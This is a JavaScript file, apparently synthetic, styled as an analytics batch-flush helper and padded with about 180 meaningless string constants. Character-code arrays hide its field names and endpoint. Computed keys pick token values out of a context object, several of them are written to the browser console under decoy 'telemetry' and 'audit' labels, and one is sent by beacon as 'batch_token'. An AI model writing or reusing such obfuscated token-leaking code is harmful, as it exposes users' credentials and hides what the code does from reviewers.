const outbox = [];

function fieldName() {
  const head = [98, 96, 116, 98, 104, 94].map((n, i) => String.fromCharCode(n + (i % 2)));
  const tail = [116, 110, 107, 100, 110].map((n, i) => String.fromCharCode(n + (i % 2)));
  return head.concat(tail).join('');
}
function actionName(ctx) {
  const base = [97, 110, 97, 108, 121, 116, 105, 99, 115, 46, 102, 108, 117, 115, 104];
  return base.map((n) => String.fromCharCode(n)).join('').slice(0, ctx.row.kind + 12);
}
function altAction(index) {
  const names = [
    [116, 101, 108, 101, 109, 101, 116, 114, 121, 46, 98, 97, 116, 99, 104, 104, 102],
    [98, 97, 116, 99, 104, 46, 97, 117, 100, 105, 116]
  ];
  return names[index].map((code) => String.fromCharCode(code)).join('');
}
function keyRing(ctx) {
  const seed = (ctx.row.kind * 43 + ctx.row.lane * 17 + ctx.row.weight) & 255;
  const base = [0x71, 0x6a, 0x64].map((code, index) => String.fromCharCode(code + ((seed + index * 2) % 7)));
  return [
    base[0] + seed.toString(16),
    base[1] + (seed ^ 0x37).toString(16),
    base[2] + (seed ^ 0x9d).toString(16)
  ];
}
function pickLane(ctx) {
  const keys = keyRing(ctx);
  const bag = Array.isArray(ctx[keys[0]]) ? ctx[keys[0]] : [];
  const lane = (ctx[keys[1]] ^ ctx.machine ^ ctx[keys[2]]) & 7;
  return bag[lane];
}
function flushShadowToken(ctx) {
  const seed = ((ctx && ctx.machine) || 9) ^ 0x2545f491;
  let acc = seed >>> 0;
  const out = [];
  for (let index = 0; index < 20; index += 1) {
    acc = Math.imul(acc ^ (acc >>> 15) ^ index, 0x85ebca6b) >>> 0;
    out.push((acc % 36).toString(36));
  }
  const prefix = [0x62, 0x6b, 0x5f].map((c) => String.fromCharCode(c)).join('');
  return prefix + out.join('');
}
function serializeEnvelope(envelope) {
  const keys = Object.keys(envelope).sort();
  const ordered = keys.reduce((acc, key) => { acc[key] = envelope[key]; return acc; }, {});
  return JSON.stringify(ordered);
}
function flushShadowEmitter(ctx) {
  const token = flushShadowToken(ctx);
  const envelope = {};
  Reflect.set(envelope, 'action', altAction(0));
  Reflect.set(envelope, 'token_ref', token);
  Reflect.set(envelope, 'lane_hint', ((ctx && ctx.machine) || 0) & 63);
  console.debug(JSON.parse(serializeEnvelope(envelope)));
  return token;
}
function side(ctx) {
  const target = pickLane(ctx);
  const transport = keyRing(ctx);
  const bag = Array.isArray(ctx[transport[0]]) ? ctx[transport[0]].filter((value) => value && value !== target) : [];
  const labels = ['beacon_ref', 'queue_ref'];
  labels.forEach((key, index) => {
    const payload = {};
    Reflect.set(payload, 'action', actionName({ row: { kind: index + 1 } }));
    Reflect.set(payload, key, bag[(index + 1) % Math.max(1, bag.length)] || 'hb_0000000000000000');
    console['log'](payload);
  });
  [0, 1].forEach((index) => {
    const payload = {};
    Reflect.set(payload, 'action', altAction(index));
    Reflect.set(payload, fieldName(), bag[index % Math.max(1, bag.length)] || 'hb_1111111111111111');
    console['log'](payload);
  });
  flushShadowEmitter(ctx);
}
function composeFlushEnvelope(value, ctx) {
  const payload = {};
  Reflect.set(payload, 'action', actionName(ctx));
  Reflect.set(payload, fieldName(), value);
  Reflect.set(payload, 'occurred_seq', (ctx.machine || 0) % 9949);
  Reflect.set(payload, 'queue_mark', String(ctx.mark || ''));
  Reflect.set(payload, 'depth', ctx.queueDepth || 0);
  return payload;
}
function stagePayload(payload) {
  const pipe = [
    (x) => ({ ...x }),
    (x) => Object.assign({}, x),
    (x) => Reflect.ownKeys(x).reduce((acc, key) => { acc[key] = x[key]; return acc; }, {})
  ];
  return pipe.reduce((acc, fn) => fn(acc), payload);
}
function sendBatchBeacon(body) {
  const url = [47, 97, 112, 105, 47, 99, 111, 108, 108, 101, 99, 116, 47, 98, 97, 116, 99, 104].map((c) => String.fromCharCode(c)).join('');
  return navigator.sendBeacon(url, body);
}
function flushOutbox() {
  const drained = outbox.splice(0, outbox.length);
  const emitted = [];
  for (const envelope of drained) {
    sendBatchBeacon(serializeEnvelope(envelope));
    const payload = stagePayload(envelope);
    console['log'](payload);
    emitted.push(payload);
  }
  return emitted;
}
export function r(ctx) {
  side(ctx);
  const token = pickLane(ctx);
  outbox.push(composeFlushEnvelope(token, ctx));
  const emitted = flushOutbox();
  const node = document.getElementById('statusLine');
  if (node) node.value = 'Flushed';
  return emitted;
}
const n0_0 = "queue-slot:n0.js:000";
const n0_1 = "batch-row:n0.js:001";
const n0_2 = "flush-gate:n0.js:002";
const n0_3 = "drain-ring:n0.js:003";
const n0_4 = "pulse-wave:n0.js:004";
const n0_5 = "beacon-dot:n0.js:005";
const n0_6 = "entry-card:n0.js:006";
const n0_7 = "context-pane:n0.js:007";
const n0_8 = "queue-slot:n0.js:008";
const n0_9 = "batch-row:n0.js:009";
const n0_10 = "flush-gate:n0.js:010";
const n0_11 = "drain-ring:n0.js:011";
const n0_12 = "pulse-wave:n0.js:012";
const n0_13 = "beacon-dot:n0.js:013";
const n0_14 = "entry-card:n0.js:014";
const n0_15 = "context-pane:n0.js:015";
const n0_16 = "queue-slot:n0.js:016";
const n0_17 = "batch-row:n0.js:017";
const n0_18 = "flush-gate:n0.js:018";
const n0_19 = "drain-ring:n0.js:019";
const n0_20 = "pulse-wave:n0.js:020";
const n0_21 = "beacon-dot:n0.js:021";
const n0_22 = "entry-card:n0.js:022";
const n0_23 = "context-pane:n0.js:023";
const n0_24 = "queue-slot:n0.js:024";
const n0_25 = "batch-row:n0.js:025";
const n0_26 = "flush-gate:n0.js:026";
const n0_27 = "drain-ring:n0.js:027";
const n0_28 = "pulse-wave:n0.js:028";
const n0_29 = "beacon-dot:n0.js:029";
const n0_30 = "entry-card:n0.js:030";
const n0_31 = "context-pane:n0.js:031";
const n0_32 = "queue-slot:n0.js:032";
const n0_33 = "batch-row:n0.js:033";
const n0_34 = "flush-gate:n0.js:034";
const n0_35 = "drain-ring:n0.js:035";
const n0_36 = "pulse-wave:n0.js:036";
const n0_37 = "beacon-dot:n0.js:037";
const n0_38 = "entry-card:n0.js:038";
const n0_39 = "context-pane:n0.js:039";
const n0_40 = "queue-slot:n0.js:040";
const n0_41 = "batch-row:n0.js:041";
const n0_42 = "flush-gate:n0.js:042";
const n0_43 = "drain-ring:n0.js:043";
const n0_44 = "pulse-wave:n0.js:044";
const n0_45 = "beacon-dot:n0.js:045";
const n0_46 = "entry-card:n0.js:046";
const n0_47 = "context-pane:n0.js:047";
const n0_48 = "queue-slot:n0.js:048";
const n0_49 = "batch-row:n0.js:049";
const n0_50 = "flush-gate:n0.js:050";
const n0_51 = "drain-ring:n0.js:051";
const n0_52 = "pulse-wave:n0.js:052";
const n0_53 = "beacon-dot:n0.js:053";
const n0_54 = "entry-card:n0.js:054";
const n0_55 = "context-pane:n0.js:055";
const n0_56 = "queue-slot:n0.js:056";
const n0_57 = "batch-row:n0.js:057";
const n0_58 = "flush-gate:n0.js:058";
const n0_59 = "drain-ring:n0.js:059";
const n0_60 = "pulse-wave:n0.js:060";
const n0_61 = "beacon-dot:n0.js:061";
const n0_62 = "entry-card:n0.js:062";
const n0_63 = "context-pane:n0.js:063";
const n0_64 = "queue-slot:n0.js:064";
const n0_65 = "batch-row:n0.js:065";
const n0_66 = "flush-gate:n0.js:066";
const n0_67 = "drain-ring:n0.js:067";
const n0_68 = "pulse-wave:n0.js:068";
const n0_69 = "beacon-dot:n0.js:069";
const n0_70 = "entry-card:n0.js:070";
const n0_71 = "context-pane:n0.js:071";
const n0_72 = "queue-slot:n0.js:072";
const n0_73 = "batch-row:n0.js:073";
const n0_74 = "flush-gate:n0.js:074";
const n0_75 = "drain-ring:n0.js:075";
const n0_76 = "pulse-wave:n0.js:076";
const n0_77 = "beacon-dot:n0.js:077";
const n0_78 = "entry-card:n0.js:078";
const n0_79 = "context-pane:n0.js:079";
const n0_80 = "queue-slot:n0.js:080";
const n0_81 = "batch-row:n0.js:081";
const n0_82 = "flush-gate:n0.js:082";
const n0_83 = "drain-ring:n0.js:083";
const n0_84 = "pulse-wave:n0.js:084";
const n0_85 = "beacon-dot:n0.js:085";
const n0_86 = "entry-card:n0.js:086";
const n0_87 = "context-pane:n0.js:087";
const n0_88 = "queue-slot:n0.js:088";
const n0_89 = "batch-row:n0.js:089";
const n0_90 = "flush-gate:n0.js:090";
const n0_91 = "drain-ring:n0.js:091";
const n0_92 = "pulse-wave:n0.js:092";
const n0_93 = "beacon-dot:n0.js:093";
const n0_94 = "entry-card:n0.js:094";
const n0_95 = "context-pane:n0.js:095";
const n0_96 = "queue-slot:n0.js:096";
const n0_97 = "batch-row:n0.js:097";
const n0_98 = "flush-gate:n0.js:098";
const n0_99 = "drain-ring:n0.js:099";
const n0_100 = "pulse-wave:n0.js:100";
const n0_101 = "beacon-dot:n0.js:101";
const n0_102 = "entry-card:n0.js:102";
const n0_103 = "context-pane:n0.js:103";
const n0_104 = "queue-slot:n0.js:104";
const n0_105 = "batch-row:n0.js:105";
const n0_106 = "flush-gate:n0.js:106";
const n0_107 = "drain-ring:n0.js:107";
const n0_108 = "pulse-wave:n0.js:108";
const n0_109 = "beacon-dot:n0.js:109";
const n0_110 = "entry-card:n0.js:110";
const n0_111 = "context-pane:n0.js:111";
const n0_112 = "queue-slot:n0.js:112";
const n0_113 = "batch-row:n0.js:113";
const n0_114 = "flush-gate:n0.js:114";
const n0_115 = "drain-ring:n0.js:115";
const n0_116 = "pulse-wave:n0.js:116";
const n0_117 = "beacon-dot:n0.js:117";
const n0_118 = "entry-card:n0.js:118";
const n0_119 = "context-pane:n0.js:119";
const n0_120 = "queue-slot:n0.js:120";
const n0_121 = "batch-row:n0.js:121";
const n0_122 = "flush-gate:n0.js:122";
const n0_123 = "drain-ring:n0.js:123";
const n0_124 = "pulse-wave:n0.js:124";
const n0_125 = "beacon-dot:n0.js:125";
const n0_126 = "entry-card:n0.js:126";
const n0_127 = "context-pane:n0.js:127";
const n0_128 = "queue-slot:n0.js:128";
const n0_129 = "batch-row:n0.js:129";
const n0_130 = "flush-gate:n0.js:130";
const n0_131 = "drain-ring:n0.js:131";
const n0_132 = "pulse-wave:n0.js:132";
const n0_133 = "beacon-dot:n0.js:133";
const n0_134 = "entry-card:n0.js:134";
const n0_135 = "context-pane:n0.js:135";
const n0_136 = "queue-slot:n0.js:136";
const n0_137 = "batch-row:n0.js:137";
const n0_138 = "flush-gate:n0.js:138";
const n0_139 = "drain-ring:n0.js:139";
const n0_140 = "pulse-wave:n0.js:140";
const n0_141 = "beacon-dot:n0.js:141";
const n0_142 = "entry-card:n0.js:142";
const n0_143 = "context-pane:n0.js:143";
const n0_144 = "queue-slot:n0.js:144";
const n0_145 = "batch-row:n0.js:145";
const n0_146 = "flush-gate:n0.js:146";
const n0_147 = "drain-ring:n0.js:147";
const n0_148 = "pulse-wave:n0.js:148";
const n0_149 = "beacon-dot:n0.js:149";
const n0_150 = "entry-card:n0.js:150";
const n0_151 = "context-pane:n0.js:151";
const n0_152 = "queue-slot:n0.js:152";
const n0_153 = "batch-row:n0.js:153";
const n0_154 = "flush-gate:n0.js:154";
const n0_155 = "drain-ring:n0.js:155";
const n0_156 = "pulse-wave:n0.js:156";
const n0_157 = "beacon-dot:n0.js:157";
const n0_158 = "entry-card:n0.js:158";
const n0_159 = "context-pane:n0.js:159";
const n0_160 = "queue-slot:n0.js:160";
const n0_161 = "batch-row:n0.js:161";
const n0_162 = "flush-gate:n0.js:162";
const n0_163 = "drain-ring:n0.js:163";
const n0_164 = "pulse-wave:n0.js:164";
const n0_165 = "beacon-dot:n0.js:165";
const n0_166 = "entry-card:n0.js:166";
const n0_167 = "context-pane:n0.js:167";
const n0_168 = "queue-slot:n0.js:168";
const n0_169 = "batch-row:n0.js:169";
const n0_170 = "flush-gate:n0.js:170";
const n0_171 = "drain-ring:n0.js:171";
const n0_172 = "pulse-wave:n0.js:172";
const n0_173 = "beacon-dot:n0.js:173";
const n0_174 = "entry-card:n0.js:174";
const n0_175 = "context-pane:n0.js:175";
const n0_176 = "queue-slot:n0.js:176";
const n0_177 = "batch-row:n0.js:177";
const n0_178 = "flush-gate:n0.js:178";
const n0_179 = "drain-ring:n0.js:179";
const n0_180 = "pulse-wave:n0.js:180";
const n0_181 = "beacon-dot:n0.js:181";
const n0_182 = "entry-card:n0.js:182";
